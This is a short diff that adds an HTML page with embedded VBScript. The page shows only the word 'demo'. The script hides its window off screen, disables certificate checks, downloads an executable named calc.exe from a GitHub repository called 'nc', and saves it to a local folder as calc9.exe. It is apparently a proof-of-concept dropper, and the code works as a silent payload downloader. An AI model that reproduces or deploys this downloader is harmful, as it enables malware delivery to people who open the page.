@@ -1,0 +1,25 @@
+<HTML> 
+<meta http-equiv="x-ua-compatible" content="text/html; charset=utf-8; IE=5">
+<HEAD> 
+<script language="VBScript.Encode">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Const adTypeBinary = 1
+Const adSaveCreateOverWrite = 2
+Dim http,ado
+Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
+http.SetOption 2, 13056
+http.open "GET","https://github.com/HoldOnToYourHeart/nc/raw/master/calc.exe",False
+http.send
+Set ado = createobject("Adodb.Stream")
+ado.Type = adTypeBinary
+ado.Open
+ado.Write http.responseBody
+ado.SaveToFile "C:\Users\31030\Desktop\tools\test\calc9.exe"
+ado.Close
+</script>
+<body>
+demo
+</body>
+</HEAD> 
+</HTML>
